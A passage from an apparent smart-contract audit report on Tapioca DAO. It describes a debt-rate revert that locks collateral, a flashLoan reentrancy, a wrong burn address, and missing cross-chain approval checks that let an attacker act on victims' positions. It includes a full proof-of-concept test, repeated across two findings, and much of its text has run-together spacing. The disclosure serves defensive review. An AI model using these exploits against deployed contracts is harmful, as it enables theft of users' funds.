https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L242-L255
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L180-L201
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L512-L520
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L309-L317
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L263-L271
Following conditions have to be met for this issue to happen:
This issue occurs when the BigBang market is not an ETH market.Penrose.registerBigBang()being called withdataparam wheredata.debtStartPointis nonzero.The first borrower borrows usingBigBang.borrow(), with function paramamount(borrow amount) has to be less thandebtStartPoint.
NowBigBang.getDebtRate()will always revert and the collateral from the first borrower is locked, becauseBigBang.getDebtRate()is used inBigBang._accrue(), andBigBang._accrue()is used in every function that involves totalBorrow like inBigBang.liquidate(),BigBang.repay().
The reason for the revert is that inBigBang.getDebtRate(),totalBorrow.elasticwhich gets assigned to the variable_currentDebt(line 186 BigBang.sol) will not be 0, and then on line 192 in the BigBang contract, the_currentDebtis smaller thandebtStartPointwhich causes the revert.
As a consequence the collateral is trapped as repay or liquidate requires to call accrue before hand.
Proof of Concept
The following gist contains a proof of concept to demonstrate this issue.
A non-ETH bigbang market (wbtc market) is deployed withPenrose::registerBigBang. Note that thedebtStartPointparameter in the init data is non-zero (set to be 1e18).
First we set up the primary eth market:
Some weth is minted and deposited to the ETH market. Then some assets were borrowed against the collateral. This is necessary condition for this bug to happen, which is the ETH market to have some borrowed asset. However, this condition is very likely to be fulfilled, as the primary ETH market would be deployed before any non-eth market.
Now, an innocent user is adding collateral and borrows in the non-eth market (the wbtc market). The issue occurs when the user borrows less than thedebtStartPoint. If the user should borrow less than thedebtStartPoint, theBigBang::accruewill revert and the collateral is trapped in this Market.
https://gist.github.com/zzzitron/a6d6377b73130819f15f1e5a2e2a2ba9
The bug happens here in the line 192 in theBigBang.
179/// @notice returns the current debt rate180functiongetDebtRate()publicviewreturns(uint256) {181if(_isEthMarket)returnpenrose.bigBangEthDebtRate();// default 0.5%182if(totalBorrow.elastic==0)returnminDebtRate;183184uint256_ethMarketTotalDebt=BigBang(penrose.bigBangEthMarket())185.getTotalDebt();186uint256_currentDebt=totalBorrow.elastic;187uint256_maxDebtPoint= (_ethMarketTotalDebt*188debtRateAgainstEthMarket) /1e18;189190if(_currentDebt>=_maxDebtPoint)returnmaxDebtRate;191192uint256debtPercentage= ((_currentDebt-debtStartPoint) *193DEBT_PRECISION) / (_maxDebtPoint-debtStartPoint);194uint256debt= ((maxDebtRate-minDebtRate) *debtPercentage) /195DEBT_PRECISION+196minDebtRate;197
Recommended Mitigation Steps
Consider adding a require statement toBigBang.borrow()to make sure that the borrow amount has to be >=debtStartPoint.
// BigBang// borrow247require(amount>=debtStartPoint);
0xRektora (Tapioca) confirmed

[H-32] Reentrancy inUSDO.flashLoan(), enabling an attacker to borrow unlimited USDO exceeding the max borrow limit
Submitted byzzzitron, also found byRedOneN,unsafesol,GalloDaSballo,kodyvim,ayeslick,andy, anddirk_y
Due to an reentrancy attack vector, an attacker can flashLoan an unlimited amount of USDO. For example the attacker can create a malicious contract as thereceiver, to execute the attack via theonFlashLoancallback (line 94 USDO.sol).
The exploit works becauseUSDO.flashLoan()is missing a reentrancy protection (modifier).
As a result an unlimited amount of USDO can be borrowed by an attacker via the flashLoan exploit described above.
Proof of Concept
Here is a POC that shows an exploit:
https://gist.github.com/zzzitron/a121bc1ba8cc947d927d4629a90f7991
To run the exploit add this malicious contract into the contracts folder:
https://gist.github.com/zzzitron/8de3be7ddf674cc19a6272b59cfccde1
Recommended Mitigation Steps
Consider adding some reentrancy protection modifier toUSDO.flashLoan().
0xRektora (Tapioca) confirmed, but disagreed with severity and commented:
Should beHighseverity, could really harm the protocol.
LSDan (Judge) increased severity to High

[H-33]BaseTOFTLeverageModule.sol:leverageDownInternaltries to burn tokens from wrong address
Submitted bycarrotsmuggler, also found byxuwinnie
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTLeverageModule.sol#L212
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTLeverageModule.sol#L269-L277
The functionsendForLeverageis used to interact with the USDO token on a different chain. Lets assume the origin of the tx is chain A, and the destination is chain B. The BaseTOFT contract sends a message through the lz endpoints to make a call in the destination chain.
The flow of control is as follows:
Chain A : user -call-> BaseTOFT.sol:sendForLeverage-delegateCall-> BaseTOFTLeverageModule.sol:sendForLeverage-call-> lzEndpointA
Chain B : lzEndpointB -call-> BaseTOFT.sol:_nonblockingLzReceive-delegateCall-> BaseTOFTLeverageModule.sol:leverageDown-delegateCall->leverageDownInternal
For the last call toleverageDownInternal, themsg.senderis the lzEndpointB. This is because all the calls since then have been delegate calls, and thus msg.sender has not been able to change. We analyze theleverageDownInternalfunction in this context.
functionleverageDownInternal(uint256amount,IUSDOBase.ILeverageSwapDatamemoryswapData,IUSDOBase.ILeverageExternalContractsDatamemoryexternalData,IUSDOBase.ILeverageLZDatamemorylzData,addressleverageFor)publicpayable{_unwrap(address(this),amount);
The very first operation is to do an unwrap of the mTapiocaOFT token. This is done by calling_unwrapdefined in thesamecontractas shown.
function_unwrap(address_toAddress,uint256_amount)private{_burn(msg.sender,_amount);if(erc20==address(0)) {_safeTransferETH(_toAddress,_amount);}else{IERC20(erc20).safeTransfer(_toAddress,_amount);}}
Here we see the contract is trying to burn tokens from themsg.senderaddress. But the issue is in this context, themsg.senderis the lzEndpoint on chain B who is doing the call, and they dont have any TOFT tokens there. Thus this call will revert.
The TOFT tokens are actually held within the same contract where the execution is happening. This is because in theleverageDownfunction, we see the contract credit itself with TOFT tokens.
if(!credited) {_creditTo(_srcChainId,address(this),amount);creditedPackets[_srcChainId][_srcAddress][_nonce] =true;}
Thus the tokens are actually present inaddress(this)and not inmsg.sender. Thus the burn should be done fromaddress(this)and notmsg.sender. Thus all cross chain calls for this function will fail and revert.
Since this leads to broken functionality, this is considered a high severity issue.
Proof of Concept
Since no test exists for thesendForLeveragefunction, no POC is provided. However the flow of control and detailed explanation is provided above.
Recommended Mitigation Steps
Run_burn(address(this),amount)to burn the tokens instead of unwrapping. Then do the eth/erc20 transfer from the contract.
0xRektora (Tapioca) confirmed via duplicate issue 725

[H-34]BaseTOFT.sol:retrieveFromStrategycan be used to manipulate other user’s positions due to absent approval check
Submitted bycarrotsmuggler, also found byxuwinnie,peakbolt, and0x73696d616f
The functionretrieveFromStrategyis used to trigger a removal of TOFT tokens from a strategy on a different chain. The function takes the parameterfrom, which is the account whose tokens will be retrieved.
The main issue is that anyone can call this function with any address passed to thefromparameter. There is no allowance check on the chain, allowing this operation. Let’s walk through the steps to see how this is executed.
BaseTOFT.sol:retrieveFromStrategyis called by the attacker with afromaddress of the victim. This function calls theretrieveFromStrategyfunction in the strategy module.
_executeModule(Module.Strategy,abi.encodeWithSelector(BaseTOFTStrategyModule.retrieveFromStrategy.selector,from,amount,share,assetId,lzDstChainId,zroPaymentAddress,airdropAdapterParam),false);
BaseTOFTStrategyModule.sol:retrieveFromStrategyis called. This function packs some data and sends it forward to the lz endpoint. Point to note, is that no approval check is done for themsg.senderof this whole setup yet.
bytesmemorylzPayload=abi.encode(PT_YB_RETRIEVE_STRAT,LzLib.addressToBytes32(_from),toAddress,amount,share,assetId,zroPaymentAddress);// lzsend(...)
After the message is sent, thelzendpointon the receiving chain will call the TOFT contract again. Now, themsg.senderisnotthe attacker, but is instead the lzendpoint! The endpoint call gets delegated to thestrategyWithdrawfunction in the Strategy module.
(,bytes32from,,uint256_amount,uint256_share,uint256_assetId,address_zroPaymentAddress) =abi.decode(_payload,(uint16,bytes32,bytes32,uint256,uint256,uint256,address));
Here we see the unpacking. note that the second unpacked value is put in thefromfield. This is an address determined by the attacker and passed through the layerzero endpoints. The contract then calls_retrieveFromYieldBoxto take out tokens from the Yieldbox. They are then sent cross chain back to thefromaddress.
_retrieveFromYieldBox(_assetId,_amount,_share,_from,address(this));_debitFrom(address(this),lzEndpoint.getChainId(),LzLib.addressToBytes32(address(this)),_amount);bytesmemorylzSendBackPayload=_encodeSendPayload(from,_ld2sd(_amount));_lzSend(_srcChainId,lzSendBackPayload,payable(this),_zroPaymentAddress,"",address(this).balance);
Thus it is evident from this call that the YieldBox contract being called has no idea that the original sender was the attacker. Instead, for the YieldBox contract, themsg.senderis the current TOFT contract. If users want to use the cross chain operations, they have to give allowance to the TOFT address. Thus we can assume that the victim has already given allowance to this address. Thus the YieldBox thinks themsg.senderis the TOFT contract, who is allowed, and thus executes the operations.
Thus we have demonstrated that the attacker is able to call a function on the victim’s YieldBox positionwithoutbeing given any allowance by setting the victim’s address in thefromfield. Thus this is a high severity issue since the victim’s tokens are withdrawn and send to a different chain without their consent.
Proof of Concept
Two lines from the test in test/TapiocaOFT.test.ts is changed to show this issue. Below is the full test for reference. The changed bits are marked with arrows.
it.only("should be able to deposit & withdraw from a strategy available on another layer",async()=>{const{signer,erc20Mock,mintAndApprove,bigDummyAmount,utils,randomUser,//@audit <------------------------------------- take other user address} =awaitloadFixture(setupFixture)constLZEndpointMock_chainID_0=awaitutils.deployLZEndpointMock(31337)constLZEndpointMock_chainID_10=awaitutils.deployLZEndpointMock(10)consttapiocaWrapper_0=awaitutils.deployTapiocaWrapper()consttapiocaWrapper_10=awaitutils.deployTapiocaWrapper()//Deploy YB and StrategiesconstyieldBox0Data=awaitdeployYieldBox(signer)constyieldBox10Data=awaitdeployYieldBox(signer)constYieldBox_0=yieldBox0Data.yieldBoxconstYieldBox_10=yieldBox10Data.yieldBox{consttxData=awaittapiocaWrapper_0.populateTransaction.createTOFT(erc20Mock.address,(awaitutils.Tx_deployTapiocaOFT(LZEndpointMock_chainID_0.address,erc20Mock.address,YieldBox_0.address,31337,signer)).txData,ethers.utils.randomBytes(32),false)txData.gasLimit=awaithre.ethers.provider.estimateGas(txData)awaitsigner.sendTransaction(txData)}consttapiocaOFT0= (awaitutils.attachTapiocaOFT(awaittapiocaWrapper_0.tapiocaOFTs((awaittapiocaWrapper_0.tapiocaOFTLength()).sub(1))))asTapiocaOFT// Deploy TapiocaOFT10{consttxData=awaittapiocaWrapper_10.populateTransaction.createTOFT(erc20Mock.address,(awaitutils.Tx_deployTapiocaOFT(LZEndpointMock_chainID_10.address,erc20Mock.address,YieldBox_10.address,10,signer)).txData,ethers.utils.randomBytes(32),false)txData.gasLimit=awaithre.ethers.provider.estimateGas(txData)awaitsigner.sendTransaction(txData)}consttapiocaOFT10= (awaitutils.attachTapiocaOFT(awaittapiocaWrapper_10.tapiocaOFTs((awaittapiocaWrapper_10.tapiocaOFTLength()).sub(1))))asTapiocaOFTconststrategy0Data=awaitdeployToftMockStrategy(signer,YieldBox_0.address,tapiocaOFT0.address)conststrategy10Data=awaitdeployToftMockStrategy(signer,YieldBox_10.address,tapiocaOFT10.address)constStrategy_0=strategy0Data.tOFTStrategyMockconstStrategy_10=strategy10Data.tOFTStrategyMock// SetupawaitmintAndApprove(erc20Mock,tapiocaOFT0,signer,bigDummyAmount)awaittapiocaOFT0.wrap(signer.address,signer.address,bigDummyAmount)// Set trusted remotesconstdstChainId0=31337constdstChainId10=10awaittapiocaWrapper_0.executeTOFT(tapiocaOFT0.address,tapiocaOFT0.interface.encodeFunctionData("setTrustedRemote", [dstChainId10,ethers.utils.solidityPack(["address","address"],[tapiocaOFT10.address,tapiocaOFT0.address]),]),true)awaittapiocaWrapper_10.executeTOFT(tapiocaOFT10.address,tapiocaOFT10.interface.encodeFunctionData("setTrustedRemote", [dstChainId0,ethers.utils.solidityPack(["address","address"],[tapiocaOFT0.address,tapiocaOFT10.address]),]),true)// Link endpoints with addressesawaitLZEndpointMock_chainID_0.setDestLzEndpoint(tapiocaOFT10.address,LZEndpointMock_chainID_10.address)awaitLZEndpointMock_chainID_10.setDestLzEndpoint(tapiocaOFT0.address,LZEndpointMock_chainID_0.address)//Register tokens on YBawaitYieldBox_0.registerAsset(1,tapiocaOFT0.address,Strategy_0.address,0)awaitYieldBox_10.registerAsset(1,tapiocaOFT10.address,Strategy_10.address,0)consttapiocaOFT0Id=awaitYieldBox_0.ids(1,tapiocaOFT0.address,Strategy_0.address,0)consttapiocaOFT10Id=awaitYieldBox_10.ids(1,tapiocaOFT10.address,Strategy_10.address,0)expect(tapiocaOFT0Id.eq(1)).to.be.trueexpect(tapiocaOFT10Id.eq(1)).to.be.true//Test deposits on same chainawaitmintAndApprove(erc20Mock,tapiocaOFT0,signer,bigDummyAmount)awaittapiocaOFT0.wrap(signer.address,signer.address,bigDummyAmount)awaittapiocaOFT0.approve(YieldBox_0.address,ethers.constants.MaxUint256)lettoDepositShare=awaitYieldBox_0.toShare(tapiocaOFT0Id,bigDummyAmount,false)awaitYieldBox_0.depositAsset(tapiocaOFT0Id,signer.address,signer.address,0,toDepositShare)letyb0Balance=awaitYieldBox_0.amountOf(signer.address,tapiocaOFT0Id)letvaultAmount=awaitStrategy_0.vaultAmount()expect(yb0Balance.gt(bigDummyAmount)).to.be.true//bc of the yieldexpect(vaultAmount.eq(bigDummyAmount)).to.be.true//Test withdraw on same chainawaitmintAndApprove(erc20Mock,tapiocaOFT0,signer,bigDummyAmount)awaittapiocaOFT0.wrap(signer.address,signer.address,bigDummyAmount)awaittapiocaOFT0.transfer(Strategy_0.address,yb0Balance.sub(bigDummyAmount))//assures the strategy has enough tokens to withdrawconstsignerBalanceBeforeWithdraw=awaittapiocaOFT0.balanceOf(signer.address)consttoWithdrawShare=awaitYieldBox_0.balanceOf(signer.address,tapiocaOFT0Id)awaitYieldBox_0.withdraw(tapiocaOFT0Id,signer.address,signer.address,0,toWithdrawShare)constsignerBalanceAfterWithdraw=awaittapiocaOFT0.balanceOf(signer.address)expect(signerBalanceAfterWithdraw.sub(signerBalanceBeforeWithdraw).gt(bigDummyAmount)).to.be.truevaultAmount=awaitStrategy_0.vaultAmount()expect(vaultAmount.eq(0)).to.be.trueyb0Balance=awaitYieldBox_0.amountOf(signer.address,tapiocaOFT0Id)expect(vaultAmount.eq(0)).to.be.trueconstlatestBalance=awaitStrategy_0.currentBalance()expect(latestBalance.eq(0)).to.be.truetoDepositShare=awaitYieldBox_0.toShare(tapiocaOFT0Id,bigDummyAmount,false)consttotals=awaitYieldBox_0.assetTotals(tapiocaOFT0Id)expect(totals[0].eq(0)).to.be.trueexpect(totals[1].eq(0)).to.be.true//Cross chain deposit from TapiocaOFT_10 to Strategy_0awaitmintAndApprove(erc20Mock,tapiocaOFT0,signer,bigDummyAmount)awaittapiocaOFT0.wrap(signer.address,signer.address,bigDummyAmount)awaitexpect(tapiocaOFT0.sendFrom(signer.address,10,ethers.utils.defaultAbiCoder.encode(["address"],[signer.address]),bigDummyAmount,{refundAddress:signer.address,zroPaymentAddress:ethers.constants.AddressZero,adapterParams:"0x",},{value:ethers.utils.parseEther("0.02"),gasLimit:2_000_000,})).to.not.be.revertedconstsignerBalanceForTOFT10=awaittapiocaOFT10.balanceOf(signer.address)expect(signerBalanceForTOFT10.eq(bigDummyAmount)).to.be.trueconstasset=awaitYieldBox_0.assets(tapiocaOFT0Id)expect(asset[2]).to.eq(Strategy_0.address)awaittapiocaOFT10.sendToStrategy(signer.address,signer.address,bigDummyAmount,toDepositShare,1,//asset iddstChainId0,{extraGasLimit:"2500000",zroPaymentAddress:ethers.constants.AddressZero,},{value:ethers.utils.parseEther("15"),})letstrategy0Amount=awaitStrategy_0.vaultAmount()expect(strategy0Amount.gt(0)).to.be.trueconstyb0BalanceAfterCrossChainDeposit=awaitYieldBox_0.amountOf(signer.address,tapiocaOFT0Id)expect(yb0BalanceAfterCrossChainDeposit.gt(bigDummyAmount))constairdropAdapterParams=ethers.utils.solidityPack(["uint16","uint","uint","address"],[2,800000,ethers.utils.parseEther("2"),tapiocaOFT0.address])awaitYieldBox_0.setApprovalForAsset(tapiocaOFT0.address,tapiocaOFT0Id,true)//this should be done through Magnetar in the same tx, to avoid frontrunningyb0Balance=awaitYieldBox_0.amountOf(signer.address,tapiocaOFT0Id)awaittapiocaOFT0.transfer(Strategy_0.address,yb0Balance.sub(bigDummyAmount))//assures the strategy has enough tokens to withdrawawaithre.ethers.provider.send("hardhat_setBalance", [randomUser.address,ethers.utils.hexStripZeros(ethers.utils.parseEther(String(20))._hex),])//@audit <------------------------------------------- Fund userawaittapiocaOFT10.connect(randomUser)//@audit <------------------------------------------- Call with other user instead of signer.retrieveFromStrategy(signer.address,yb0BalanceAfterCrossChainDeposit,toWithdrawShare,1,dstChainId0,ethers.constants.AddressZero,airdropAdapterParams,{value:ethers.utils.parseEther("10"),})strategy0Amount=awaitStrategy_0.vaultAmount()expect(strategy0Amount.eq(0)).to.be.trueconstsignerBalanceAfterCrossChainWithdrawal=awaittapiocaOFT10.balanceOf(signer.address)expect(signerBalanceAfterCrossChainWithdrawal.gt(bigDummyAmount)).to.be.true})
The only relevant change is that the functionretrieveFromStrategyis called from another address. The test passes, showing that an attacker, in this caserandomUsercan influence the operations of the victim, thesigner.
Recommended Mitigation Steps
Add an allowance check for themsg.senderin thestrategyWithdrawfunction.
0xRektora (Tapioca) confirmed, but disagreed with severity and commented:
Should be medium. Although annoying, attacker can’t steal the user’s asset, and will have to pay gas without profit for both chains in order to do this trick. Should be grouped in #1037.Same answer ashttps://github.com/code-423n4/2023-07-tapioca-findings/issues/1009.

[H-35]BaseTOFT.sol:removeCollateralcan be used to manipulate other user’s positions and steal tokens due to absent approval check
Submitted bycarrotsmuggler, also found byKIntern_NA
The functionremoveCollateralis used to trigger a removal of collateral on a different chain. The function takes the parameterfrom, which is the account whose collateral will be sold. It also takes the parametertowhere these collateral tokens will be transferred to.
The main issue is that anyone can call this function with any address passed to thefromparameter. There is no allowance check on the chain, allowing this operation. Let’s walk through the steps to see how this is executed. Lets assume bothfromandtoare the victim’s address for reasons explained at the end.
BaseTOFT.sol:removeCollateralis called by the attacker with afromandtoaddress of the victim. This function calls theremoveCollateralfunction in the market module.
_executeModule(Module.Market,abi.encodeWithSelector(BaseTOFTMarketModule.removeCollateral.selector,from,to,lzDstChainId,zroPaymentAddress,withdrawParams,removeParams,approvals,adapterParams),false);
BaseTOFTMarketModule.sol:removeCollateralis called. This function packs some data and sends it forward to the lz endpoint. Point to note, is that no approval check is done for themsg.senderof this whole setup yet.
bytesmemorylzPayload=abi.encode(PT_MARKET_REMOVE_COLLATERAL,from,to,toAddress,removeParams,withdrawParams,approvals);// lzsend(...)
After the message is sent, thelzendpointon the receiving chain will call the TOFT contract again. Now, themsg.senderisnotthe attacker, but is instead the lzendpoint! The endpoint call gets delegated to theremovefunction in the Market module.
(,,addressto,,ITapiocaOFT.IRemoveParamsmemoryremoveParams,ICommonData.IWithdrawParamsmemorywithdrawParams,ICommonData.IApproval[]memoryapprovals) =abi.decode(_payload,(uint16,address,address,bytes32,ITapiocaOFT.IRemoveParams,ICommonData.IWithdrawParams,ICommonData.IApproval[]));
Here we see the unpacking. note that the third unpacked value is put in thetofield. This is an address determined by the attacker and passed through the layerzero endpoints. The contract then calls a market contract’sremoveCollateralfunction.
IMarket(removeParams.market).removeCollateral(to,to,removeParams.share);
Thus it is evident from this call that the Market contract being called has no idea that the original sender was the attacker. Instead, for the Market contract, themsg.senderis the current TOFT contract. If users want to use the cross chain operations, they have to give allowance to the TOFT contract address. Thus we can assume that the victim has already given allowance to this address. Thus the market thinks themsg.senderis the TOFT contract, who is allowed, and thus executes the operations.
Thus we have demonstrated that the attacker is able to call a function on the victim’s market positionwithoutbeing given any allowance by setting the victim’s address in thetofield. While it is a suspected bug that theremoveCollateralremoves collateral from thetofield’s account and not thefromfield, since both these parameters are determined by the attacker, the bug exists either way. Thus this is a high severity issue since the victim’s collateral is withdrawn, dropping their health factor.
Proof of Concept
A POC isnt provided since the test suite does not have a test for theremoveCollateralfunction. However the functionretrieveFromStrategysuffers from the same issue and has been addressed in a different report. The test for that function can be used to demonstrate this issue.
Two lines from the test in test/TapiocaOFT.test.ts is changed to show this issue. Below is the full test for reference. The changed bits are marked with arrows.
it.only("should be able to deposit & withdraw from a strategy available on another layer",async()=>{const{signer,erc20Mock,mintAndApprove,bigDummyAmount,utils,randomUser,//@audit <------------------------------------- take other user address} =awaitloadFixture(setupFixture)constLZEndpointMock_chainID_0=awaitutils.deployLZEndpointMock(31337)constLZEndpointMock_chainID_10=awaitutils.deployLZEndpointMock(10)consttapiocaWrapper_0=awaitutils.deployTapiocaWrapper()consttapiocaWrapper_10=awaitutils.deployTapiocaWrapper()//Deploy YB and StrategiesconstyieldBox0Data=awaitdeployYieldBox(signer)constyieldBox10Data=awaitdeployYieldBox(signer)constYieldBox_0=yieldBox0Data.yieldBoxconstYieldBox_10=yieldBox10Data.yieldBox{consttxData=awaittapiocaWrapper_0.populateTransaction.createTOFT(erc20Mock.address,(awaitutils.Tx_deployTapiocaOFT(LZEndpointMock_chainID_0.address,erc20Mock.address,YieldBox_0.address,31337,signer)).txData,ethers.utils.randomBytes(32),false)txData.gasLimit=awaithre.ethers.provider.estimateGas(txData)awaitsigner.sendTransaction(txData)}consttapiocaOFT0= (awaitutils.attachTapiocaOFT(awaittapiocaWrapper_0.tapiocaOFTs((awaittapiocaWrapper_0.tapiocaOFTLength()).sub(1))))asTapiocaOFT// Deploy TapiocaOFT10{consttxData=awaittapiocaWrapper_10.populateTransaction.createTOFT(erc20Mock.address,(awaitutils.Tx_deployTapiocaOFT(LZEndpointMock_chainID_10.address,erc20Mock.address,YieldBox_10.address,10,signer)).txData,ethers.utils.randomBytes(32),false)txData.gasLimit=awaithre.ethers.provider.estimateGas(txData)awaitsigner.sendTransaction(txData)}consttapiocaOFT10= (awaitutils.attachTapiocaOFT(awaittapiocaWrapper_10.tapiocaOFTs((awaittapiocaWrapper_10.tapiocaOFTLength()).sub(1))))asTapiocaOFTconststrategy0Data=awaitdeployToftMockStrategy(signer,YieldBox_0.address,tapiocaOFT0.address)conststrategy10Data=awaitdeployToftMockStrategy(signer,YieldBox_10.address,tapiocaOFT10.address)constStrategy_0=strategy0Data.tOFTStrategyMockconstStrategy_10=strategy10Data.tOFTStrategyMock// SetupawaitmintAndApprove(erc20Mock,tapiocaOFT0,signer,bigDummyAmount)awaittapiocaOFT0.wrap(signer.address,signer.address,bigDummyAmount)// Set trusted remotesconstdstChainId0=31337constdstChainId10=10awaittapiocaWrapper_0.executeTOFT(tapiocaOFT0.address,tapiocaOFT0.interface.encodeFunctionData("setTrustedRemote", [dstChainId10,ethers.utils.solidityPack(["address","address"],[tapiocaOFT10.address,tapiocaOFT0.address]),]),true)awaittapiocaWrapper_10.executeTOFT(tapiocaOFT10.address,tapiocaOFT10.interface.encodeFunctionData("setTrustedRemote", [dstChainId0,ethers.utils.solidityPack(["address","address"],[tapiocaOFT0.address,tapiocaOFT10.address]),]),true)// Link endpoints with addressesawaitLZEndpointMock_chainID_0.setDestLzEndpoint(tapiocaOFT10.address,LZEndpointMock_chainID_10.address)awaitLZEndpointMock_chainID_10.setDestLzEndpoint(tapiocaOFT0.address,LZEndpointMock_chainID_0.address)//Register tokens on YBawaitYieldBox_0.registerAsset(1,tapiocaOFT0.address,Strategy_0.address,0)awaitYieldBox_10.registerAsset(1,tapiocaOFT10.address,Strategy_10.address,0)consttapiocaOFT0Id=awaitYieldBox_0.ids(1,tapiocaOFT0.address,Strategy_0.address,0)consttapiocaOFT10Id=awaitYieldBox_10.ids(1,tapiocaOFT10.address,Strategy_10.address,0)expect(tapiocaOFT0Id.eq(1)).to.be.trueexpect(tapiocaOFT10Id.eq(1)).to.be.true//Test deposits on same chainawaitmintAndApprove(erc20Mock,tapiocaOFT0,signer,bigDummyAmount)awaittapiocaOFT0.wrap(signer.address,signer.address,bigDummyAmount)awaittapiocaOFT0.approve(YieldBox_0.address,ethers.constants.MaxUint256)lettoDepositShare=awaitYieldBox_0.toShare(tapiocaOFT0Id,bigDummyAmount,false)awaitYieldBox_0.depositAsset(tapiocaOFT0Id,signer.address,signer.address,0,toDepositShare)letyb0Balance=awaitYieldBox_0.amountOf(signer.address,tapiocaOFT0Id)letvaultAmount=awaitStrategy_0.vaultAmount()expect(yb0Balance.gt(bigDummyAmount)).to.be.true//bc of the yieldexpect(vaultAmount.eq(bigDummyAmount)).to.be.true//Test withdraw on same chainawaitmintAndApprove(erc20Mock,tapiocaOFT0,signer,bigDummyAmount)awaittapiocaOFT0.wrap(signer.address,signer.address,bigDummyAmount)awaittapiocaOFT0.transfer(Strategy_0.address,yb0Balance.sub(bigDummyAmount))//assures the strategy has enough tokens to withdrawconstsignerBalanceBeforeWithdraw=awaittapiocaOFT0.balanceOf(signer.address)consttoWithdrawShare=awaitYieldBox_0.balanceOf(signer.address,tapiocaOFT0Id)awaitYieldBox_0.withdraw(tapiocaOFT0Id,signer.address,signer.address,0,toWithdrawShare)constsignerBalanceAfterWithdraw=awaittapiocaOFT0.balanceOf(signer.address)expect(signerBalanceAfterWithdraw.sub(signerBalanceBeforeWithdraw).gt(bigDummyAmount)).to.be.truevaultAmount=awaitStrategy_0.vaultAmount()expect(vaultAmount.eq(0)).to.be.trueyb0Balance=awaitYieldBox_0.amountOf(signer.address,tapiocaOFT0Id)expect(vaultAmount.eq(0)).to.be.trueconstlatestBalance=awaitStrategy_0.currentBalance()expect(latestBalance.eq(0)).to.be.truetoDepositShare=awaitYieldBox_0.toShare(tapiocaOFT0Id,bigDummyAmount,false)consttotals=awaitYieldBox_0.assetTotals(tapiocaOFT0Id)expect(totals[0].eq(0)).to.be.trueexpect(totals[1].eq(0)).to.be.true//Cross chain deposit from TapiocaOFT_10 to Strategy_0awaitmintAndApprove(erc20Mock,tapiocaOFT0,signer,bigDummyAmount)awaittapiocaOFT0.wrap(signer.address,signer.address,bigDummyAmount)awaitexpect(tapiocaOFT0.sendFrom(signer.address,10,ethers.utils.defaultAbiCoder.encode(["address"],[signer.address]),bigDummyAmount,{refundAddress:signer.address,zroPaymentAddress:ethers.constants.AddressZero,adapterParams:"0x",},{value:ethers.utils.parseEther("0.02"),gasLimit:2_000_000,})).to.not.be.revertedconstsignerBalanceForTOFT10=awaittapiocaOFT10.balanceOf(signer.address)expect(signerBalanceForTOFT10.eq(bigDummyAmount)).to.be.trueconstasset=awaitYieldBox_0.assets(tapiocaOFT0Id)expect(asset[2]).to.eq(Strategy_0.address)awaittapiocaOFT10.sendToStrategy(signer.address,signer.address,bigDummyAmount,toDepositShare,1,//asset iddstChainId0,{extraGasLimit:"2500000",zroPaymentAddress:ethers.constants.AddressZero,},{value:ethers.utils.parseEther("15"),})letstrategy0Amount=awaitStrategy_0.vaultAmount()expect(strategy0Amount.gt(0)).to.be.trueconstyb0BalanceAfterCrossChainDeposit=awaitYieldBox_0.amountOf(signer.address,tapiocaOFT0Id)expect(yb0BalanceAfterCrossChainDeposit.gt(bigDummyAmount))constairdropAdapterParams=ethers.utils.solidityPack(["uint16","uint","uint","address"],[2,800000,ethers.utils.parseEther("2"),tapiocaOFT0.address])awaitYieldBox_0.setApprovalForAsset(tapiocaOFT0.address,tapiocaOFT0Id,true)//this should be done through Magnetar in the same tx, to avoid frontrunningyb0Balance=awaitYieldBox_0.amountOf(signer.address,tapiocaOFT0Id)awaittapiocaOFT0.transfer(Strategy_0.address,yb0Balance.sub(bigDummyAmount))//assures the strategy has enough tokens to withdrawawaithre.ethers.provider.send("hardhat_setBalance", [randomUser.address,ethers.utils.hexStripZeros(ethers.utils.parseEther(String(20))._hex),])//@audit <------------------------------------------- Fund userawaittapiocaOFT10.connect(randomUser)//@audit <------------------------------------------- Call with other user instead of signer.retrieveFromStrategy(signer.address,yb0BalanceAfterCrossChainDeposit,toWithdrawShare,1,dstChainId0,ethers.constants.AddressZero,airdropAdapterParams,{value:ethers.utils.parseEther("10"),})strategy0Amount=awaitStrategy_0.vaultAmount()expect(strategy0Amount.eq(0)).to.be.trueconstsignerBalanceAfterCrossChainWithdrawal=awaittapiocaOFT10.balanceOf(signer.address)expect(signerBalanceAfterCrossChainWithdrawal.gt(bigDummyAmount)).to.be.true})
The only relevant change is that the functionretrieveFromStrategyis called from another address. The test passes, showing that an attacker, in tthis caserandomUsercan influence the operations of the victim, thesigner.
Recommended Mitigation Steps
Add an allowance check for themsg.senderin theremoveCollateralfunction.
0xRektora (Tapioca) confirmed
LSDan (Judge) commented:
This attack can be summed up as “approvals are not checked when operating cross-chain.” There are several instances of this bug with varying levels of severity all reported by warden carrotsmuggler. Because they all use the same attack vector and all perform undesired/unrequested acts on behalf of other users, I have grouped them and rated this issue as high risk.

[H-36]twTAP.sol: Reward tokens stored in index 0 can be stolen
Submitted bycarrotsmuggler, also found byKIntern_NA
The functionclaimAndSendRewardscan be called to collect rewards accrued by the twTAP position. This function can only be called by theTapOFT.solcontract during a crosschain operation. Thus a user on chain A can callclaimRewardsand on chain B, the function_claimRewardswill be called and a bunch of parameters will be passed in that message.
(,,addressto,uint256tokenID,IERC20[]memoryrewardTokens,IRewardClaimSendFromParams[]memoryrewardClaimSendParams) =abi.decode(_payload,(uint16,address,address,uint256,IERC20[],IRewardClaimSendFromParams[]));
